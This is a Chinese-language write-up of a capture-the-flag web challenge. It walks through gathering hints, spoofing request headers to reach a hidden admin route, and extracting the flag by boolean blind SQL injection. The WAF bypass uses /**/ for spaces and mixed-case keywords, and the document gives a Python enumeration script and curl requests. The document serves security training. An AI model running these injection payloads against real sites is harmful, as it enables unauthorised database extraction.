# 校园社团活动平台 “活动”统计站 Writeup

## 题目信息

- 目标地址：`http://39.105.213.28:8000`
- 题目类型：Web
- 核心考点：
  - 前端提示信息提取
  - HTTP 请求头伪造
  - 隐藏路由拼接
  - 布尔盲注
  - 简单 WAF 绕过

---

## 一、题目初探

访问首页后，可以看到一个普通的“校园社团活动平台”页面。页面表面上没有表单提交点，也没有明显的后台入口，但源码里已经埋了不少提示。

首页中有几处值得注意：

1. 页面顶部导航里，“活动”和“管理”两个关键词被特殊高亮。
2. 页脚处有一句提示：

```text
访问核心功能需：用户代理+官方来源页+校园令牌
```

3. “加载更多”活动时请求的是：

```text
/?page=2
```

直接访问这个接口时，响应头中多出一个关键信息：

```http
X-Campus-Token: campus-ctf-2024-abc123
```

这说明首页已经把后续访问核心接口所需的第三个条件直接暴露出来了。

---

## 二、进一步收集线索

继续查看常见探测点：

### 1. `robots.txt`

访问：

```text
/robots.txt
```

得到：

```text
User-agent: *
Allow: /static/hint/tech_stack.txt
```

这类题里 `robots.txt` 通常就是主动给路。

### 2. 技术栈提示文件

访问：

```text
/static/hint/tech_stack.txt
```

返回内容：

```text
Backend: Django 5.2.5
ATTENTION：
To access the core interface, you need to set two request headers correctly:
1. User-Agent: Must strictly follow "Campus-Stat/1.0" (including case and special symbols);
2. Referer: Must be a valid HTTPS URL containing "campus-stat.example.com" (no extra content, only the root domain).
```

至此，三要素已经齐了：

- `User-Agent: Campus-Stat/1.0`
- `Referer: https://campus-stat.example.com/`
- `X-Campus-Token: campus-ctf-2024-abc123`

后续访问隐藏功能时，需要把这三个请求头全部带上。

---

## 三、隐藏路由定位

题目首页的关键词是：

- 活动
- 管理
- 统计

这类线索通常不是让你“看懂页面”，而是让你“拼路径”。

因此可以尝试这些路由：

```text
/admin/
/stat/
/activity/
```

分别访问后，拿到了三个页面：

### 1. `/admin/`

页面中出现了一个非常关键的隐藏片段：

```text
flag{stat
```

这不是完整 flag，但说明这个页面是“起点”。

### 2. `/stat/`

页面里给出提示词：

```text
Keyword: maybe
```

虽然这里没有直接给 flag，但结合题意更像是“中间步骤页”。

### 3. `/activity/`

页面源码和控制台线索中出现：

```text
ISCC{Campus_Stat_A_
```

这已经给出了 flag 的前半部分。

### 4. 组合路径测试

继续将三个关键词按语义拼接：

```text
/admin/stat/activity/
```

该路径返回了真正的后台统计页面，说明核心入口已经找到。

---

## 四、发现注入点

访问：

```text
/admin/stat/activity/
```

页面中有一个 GET 表单参数：

```html
<input type="text" id="dim_filter" name="dim_filter" ...>
```

同时源码中埋了三条关键提示：

### 1. `title` 属性提示

```text
该参数会作为统计结果的别名使用
```

### 2. `data-hint` 提示

```text
SQL语句格式为SELECT COUNT(*) AS [维度值] FROM activity
```

### 3. HTML 注释提示

```text
Flag存储在flag表的value字段，可通过构造条件判断字符是否正确
WAF会过滤空格和完整关键词，可用/**/替代空格，简化关键词绕过
```

到这里其实已经非常明确：

- 注入点在 `dim_filter`
- 数据库查询大致与 `SELECT COUNT(*) ... FROM activity` 有关
- flag 在 `flag` 表的 `value` 字段中
- 需要用布尔盲注方式逐位判断
- 还要绕过简单 WAF

---

## 五、参数行为分析

先做几组最基本的测试：

```text
?dim_filter=1
?dim_filter=0
?dim_filter=1=1
?dim_filter=1=2
?dim_filter=2>1
?dim_filter=2<1
```

观察结果：

- 条件为真时，页面显示 `✅ 10`
- 条件为假时，页面显示 `✅ 0`

这说明后端并不是单纯把 `dim_filter` 当字符串别名，而是把它当作了一个可以影响查询结果的表达式。

也就是说，这里存在一个非常稳定的真假回显通道：

- `10` 表示 True
- `0` 表示 False

这正是标准布尔盲注场景。

---

## 六、WAF 绕过思路

源码提示已经给出：

- 空格会被过滤
- 完整敏感关键词会被拦截
- 可以用 `/**/` 替代空格

实际测试发现，像下面这种写法会被拦截：

```sql
FROM
WHERE
SELECT
```

但使用大小写混淆并配合注释空格后可以通过：

```sql
SeLeCt/**/value/**/FrOm/**/flag
```

因此，后续盲注统一使用这种写法。

---

## 七、盲注验证

先验证第一个字符是否为 `I`：

```text
?dim_filter=substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'
```

返回：

```text
✅ 10
```

再测试一个错误字符：

```text
?dim_filter=substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='X'
```

返回：

```text
✅ 0
```

这说明注入已经完全打通，接下来只需要逐位枚举即可。

---

## 八、先确定 flag 长度

使用长度判断：

```text
?dim_filter=length((SeLeCt/**/value/**/FrOm/**/flag))=27
```

返回为真，因此 flag 长度为：

```text
27
```

---

## 九、逐位枚举 flag

### 1. 手工思路

逐位判断第 `n` 个字符：

```sql
substr((SeLeCt/**/value/**/FrOm/**/flag),n,1)='x'
```

如果页面回显 `✅ 10`，说明该位字符正确。

例如：

```text
substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'
substr((SeLeCt/**/value/**/FrOm/**/flag),2,1)='S'
substr((SeLeCt/**/value/**/FrOm/**/flag),3,1)='C'
...
```

但手工跑 27 位会比较慢，因此更适合写脚本。

### 2. 自动化脚本

下面给出一份可复现的 Python 脚本。脚本逻辑是：

- 先确认长度
- 然后逐位枚举字符
- 当回显中出现 `10` 时，说明条件为真

```python
import requests
import re
import string

base = "http://39.105.213.28:8000/admin/stat/activity/"
headers = {
    "User-Agent": "Campus-Stat/1.0",
    "Referer": "https://campus-stat.example.com/",
    "X-Campus-Token": "campus-ctf-2024-abc123",
}

charset = string.ascii_letters + string.digits + string.punctuation

def query(expr):
    r = requests.get(base, headers=headers, params={"dim_filter": expr}, timeout=10)
    m = re.search(r'<div class="count">(.*?)</div>', r.text, re.S)
    if not m:
        return False
    return "10" in m.group(1)

length = None
for i in range(1, 80):
    expr = f"length((SeLeCt/**/value/**/FrOm/**/flag))={i}"
    if query(expr):
        length = i
        print("[+] length =", length)
        break

flag = ""
for pos in range(1, length + 1):
    for ch in charset:
        if ch == "'":
            continue
        expr = f"substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1)='{ch}'"
        if query(expr):
            flag += ch
            print(f"[+] pos {pos}: {flag}")
            break

print("[+] flag =", flag)
```

---

## 十、为什么后半段适合改用二分法

题目站点偶尔会超时，尤其是在字符集较大时，一个位置可能要试很多次请求。

因此更稳的做法，是直接对字符 ASCII/Unicode 编码做二分。

这个站点支持 `unicode()`，因此可以写成：

```sql
unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),22,1))>=80
```

然后通过真假结果不断缩小范围，快速得到目标字符。

这种方法的优势：

- 每个字符只需要几次请求
- 比遍历整个字符集快很多
- 站点不稳定时更实用

---

## 十一、拿到最终 flag

结合页面已经给出的前缀：

```text
ISCC{Campus_Stat_A_
```

再通过盲注恢复剩余字符，最终得到：

```text
ISCC{Campus_Stat_A_7K!zY@w}
```

---

## 十二、完整利用链总结

这道题的完整解题链条如下：

1. 访问首页，发现“活动 / 管理 / 统计”等关键词和页脚提示。
2. 访问 `/?page=2`，从响应头得到 `X-Campus-Token`。
3. 查看 `robots.txt`，拿到 `/static/hint/tech_stack.txt`。
4. 访问提示文件，获得：
   - 正确的 `User-Agent`
   - 正确的 `Referer`
5. 访问 `/admin/`、`/stat/`、`/activity/` 收集碎片线索。
6. 将关键词拼接为 `/admin/stat/activity/`，进入核心统计页面。
7. 通过源码注释定位 `dim_filter` 为注入点。
8. 根据提示得知：
   - 查询骨架
   - flag 表和字段
   - WAF 绕过方式
9. 使用布尔盲注按位恢复 flag。

这题的设计比较典型，属于“多层提示驱动型 Web 题”：

- 第一层提示在前端页面
- 第二层提示在响应头
- 第三层提示在 `robots.txt`
- 第四层提示在隐藏路由
- 最终利用点在参数注入

如果前面线索没有收干净，后面会很难推进。

---

## 十三、题目考点复盘

### 1. 不要只盯着页面可见内容

源码、注释、响应头、静态提示文件都可能藏关键信息。

### 2. 关键词往往不仅是“提示词”，也是“路径词”

这题里的“活动”“管理”“统计”并不是为了叙述页面功能，而是为了拼接隐藏路由：

```text
/admin/stat/activity/
```

### 3. 简单 WAF 不代表无法利用

题目只过滤了空格和部分完整敏感词，使用：

- `/**/` 替代空格
- 大小写混淆关键字

就可以顺利绕过。

### 4. 布尔盲注的关键是稳定真假信号

只要能找到一个稳定的真假回显点，剩下就只是自动化问题。

这题里的：

- `✅ 10` = True
- `✅ 0` = False

就非常适合写脚本。

---

## 十四、最终答案

```text
ISCC{Campus_Stat_A_7K!zY@w}
```

---

## 十五、可直接复用的请求示例

### 1. 验证核心入口

```bash
curl "http://39.105.213.28:8000/admin/stat/activity/" \
  -H "User-Agent: Campus-Stat/1.0" \
  -H "Referer: https://campus-stat.example.com/" \
  -H "X-Campus-Token: campus-ctf-2024-abc123"
```

### 2. 验证某一位字符

```bash
curl "http://39.105.213.28:8000/admin/stat/activity/?dim_filter=substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'" \
  -H "User-Agent: Campus-Stat/1.0" \
  -H "Referer: https://campus-stat.example.com/" \
  -H "X-Campus-Token: campus-ctf-2024-abc123"
```

### 3. 验证长度

```bash
curl "http://39.105.213.28:8000/admin/stat/activity/?dim_filter=length((SeLeCt/**/value/**/FrOm/**/flag))=27" \
  -H "User-Agent: Campus-Stat/1.0" \
  -H "Referer: https://campus-stat.example.com/" \
  -H "X-Campus-Token: campus-ctf-2024-abc123"
```

---

## 十六、结语

这道题本质上并不难，难点主要在于线索分散：

- 首页给一部分
- `robots.txt` 给一部分
- 响应头给一部分
- 隐藏页面再给一部分

只要信息收集做完整，后面的注入利用就很顺。题目整体思路清晰，属于比较标准、也比较适合练习“从提示到利用链闭环”的 Web 题。
